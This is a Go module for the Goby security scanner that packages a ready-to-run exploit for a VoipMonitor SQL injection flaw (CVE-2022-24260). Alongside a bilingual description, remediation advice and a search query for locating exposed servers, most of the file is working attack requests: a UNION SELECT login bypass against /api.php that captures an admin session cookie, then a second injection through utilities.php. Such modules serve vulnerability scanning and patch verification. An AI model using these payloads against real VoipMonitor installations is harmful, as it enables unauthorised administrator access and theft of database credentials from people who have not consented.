package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "VoipMonitor utilities.php SQL Injection (CVE-2022-24260)",
    "Description": "<p>VoIPmonitor is an open source network packet sniffer from the VoIPmonitor team.</p><p>Voipmonitor has a SQL injection vulnerability, which allows to obtain administrator privileges and use the utilities.php file to inject sensitive information such as database user passwords.</p>",
    "Impact": "VoipMonitor utilities.php SQL Injection (CVE-2022-24260)",
    "Recommendation": "<p>Precompile the data entered by the user.</p><p>Set up whitelist access through security devices such as firewalls.</p><p>The manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.voipmonitor.org/changelog-gui?major=5.\">https://www.voipmonitor.org/changelog-gui?major=5.</a></p>",
    "Product": "voipmonitor",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "VoipMonitor 开源网络数据包嗅探器 utilities.php 文件 SQL注入漏洞(CVE-2022-24260)",
            "Description": "<p>VoIPmonitor是VoIPmonitor团队的一个开源网络数据包嗅探器。<br></p><p>Voipmonitor 存在SQL注入漏洞，该漏洞允许获取管理员权限并且利用utilities.php 文件注入可获得数据库用户密码等敏感信息。<br></p>",
            "Impact": "<p>Voipmonitor 存在SQL注入漏洞，该漏洞允许获取管理员权限并且利用utilities.php 文件注入可获得数据库用户密码等敏感信息。<br></p>",
            "Recommendation": "<p>1、对用户输入的数据进行预编译处理。</p><p>2、通过防火墙等安全设备设置白名单访问。</p><p>3、厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://www.voipmonitor.org/changelog-gui?major=5\">https://www.voipmonitor.org/changelog-gui?major=5</a>。</p>",
            "Product": "voipmonitor",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "VoipMonitor utilities.php SQL Injection (CVE-2022-24260)",
            "Description": "<p>VoIPmonitor is an open source network packet sniffer from the VoIPmonitor team.<br></p><p>Voipmonitor has a SQL injection vulnerability, which allows to obtain administrator privileges and use the utilities.php file to inject sensitive information such as database user passwords.<br></p>",
            "Impact": "VoipMonitor utilities.php SQL Injection (CVE-2022-24260)",
            "Recommendation": "<p>Precompile the data entered by the user.</p><p>Set up whitelist access through security devices such as firewalls.</p><p>The manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.voipmonitor.org/changelog-gui?major=5.\">https://www.voipmonitor.org/changelog-gui?major=5.</a></p>",
            "Product": "voipmonitor",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "title=\"VoIPmonitor\"",
    "GobyQuery": "title=\"VoIPmonitor\"",
    "Author": "abszse",
    "Homepage": "https://www.voipmonitor.org",
    "DisclosureDate": "2022-03-23",
    "References": [
        "https://kerbit.io/research/read/blog/3"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2022-24260"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202202-315"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "module=relogin&action=login&pass=nope&user=a' UNION SELECT 'admin','admin',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null; #"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "_vm_version",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "PHPSESSID|lastheader|regex|Set-Cookie: PHPSESSID=(.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/php/model/utilities.php",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID={{{PHPSESSID}}}",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "task=loadConfigSubsystem&params={\"subsystem\": \"tracker\", \"name\":\"name\", \"user_id\":\"'UNION SELECT md5(345) #\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "d81f9c1be2e08964bf9f24b15f0e4900",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "module=relogin&action=login&pass=nope&user=a' UNION SELECT 'admin','admin',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null; #"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "_vm_version",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "PHPSESSID|lastheader|regex|Set-Cookie: PHPSESSID=(.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/php/model/utilities.php",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID={{{PHPSESSID}}}",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "task=loadConfigSubsystem&params={\"subsystem\": \"tracker\", \"name\":\"name\", \"user_id\":\"'UNION SELECT md5(345) #\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "d81f9c1be2e08964bf9f24b15f0e4900",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6876"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
